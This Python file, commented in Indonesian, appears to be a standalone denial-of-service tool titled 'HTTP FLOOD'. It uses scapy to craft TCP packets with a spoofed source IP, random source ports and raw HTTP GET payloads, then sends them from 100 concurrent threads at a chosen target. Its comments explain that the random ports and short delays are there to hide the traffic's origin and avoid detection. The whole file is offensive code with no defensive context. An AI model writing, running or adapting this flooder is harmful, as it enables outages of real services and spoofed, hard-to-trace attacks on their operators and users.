import random
import time
from scapy.all import IP, TCP, Raw, send
import os
import threading # Import thread untuk melakukan untuk menjalankan beberapa tugas secara bersamaan

def http_banner():
    RESET = '\033[0m'
    MAGENTA = '\033[0;35m'

    # Clear the terminal screen and print the header using figlet
    os.system("clear")

    print("\n")

    print(f"""{MAGENTA}

██╗  ██╗████████╗████████╗██████╗     ███████╗██╗      ██████╗  ██████╗ ██████╗ 
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
███████║   ██║      ██║   ██████╔╝    █████╗  ██║     ██║   ██║██║   ██║██║  ██║
██╔══██║   ██║      ██║   ██╔═══╝     ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
██║  ██║   ██║      ██║   ██║         ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
                                                                                 
        {RESET}""")
    
def flood_http(source_ip, target_ip, port, packet_count): # inisialisasi parameter yang digunakan

    def send_packets(start_port, count):
        for _ in range(count): # _ adalah variable dummy karena tidak memerlukan nilai loop counter.
            source_p = random.randint(1000, 65535)  # menghasilkan port sumber acak dalam rentang 1000 sampai 65535 untuk menyamarkan asal lalu lintas untuk menghindari deteksi dari target
            ip = IP(src=source_ip, dst=target_ip)  # IP sumber yang dipalsukan dan dst adalah target IP
            tcp = TCP(sport=source_p, dport=port) # Membuat header TCP dengan port sumber (sport=source_p) dan port tujuan (dport=port). sport=source_p menggunakan port sumber acak yang dihasilkan sebelumnya, dan dport=port menentukan port tujuan yang akan ditargetkan.
            http = Raw(load="GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n".format(target_ip))
            pkt = ip / tcp / http # Menggabungkan header IP, TCP, dan payload HTTP untuk membuat paket lengkap yang akan dikirim.
            send(pkt, verbose=False) # Mengirim paket yang dibuat ke jaringan. verbose=False digunakan untuk menonaktifkan output log agar konsol tidak terlalu ramai dengan pesan.
            time.sleep(0.01)  # Menambahkan jeda singkat (0,01 detik) setelah setiap pengiriman paket untuk mensimulasikan lalu lintas burst dan mengurangi kemungkinan deteksi sebagai lalu lintas anomali.

    threads = [] # Membuat daftar kosong untuk menyimpan referensi ke semua thread yang akan dibuat.
    for _ in range(100):  # Loop ini akan berjalan 100 kali, yang berarti akan ada 100 thread yang dibuat dan dijalankan secara bersamaan. 
      thread = threading.Thread(target=send_packets, args=(0, packet_count // 100)) # menghitung berapa banyak paket yang akan dikirim oleh setiap thread. maka setiap thread akan mengirimkan 100 paket
      thread.start() # Memulai eksekusi thread
      threads.append(thread) # Menambahkan thread yang baru dibuat ke dalam daftar threads untuk referensi selanjutnya.

    for thread in threads: # Loop ini mengiterasi melalui semua thread yang disimpan dalam daftar threads.
      thread.join() #  digunakan untuk memblokir thread utama (thread yang menjalankan kode ini) hingga thread spesifik (yang saat ini dalam iterasi) selesai. 

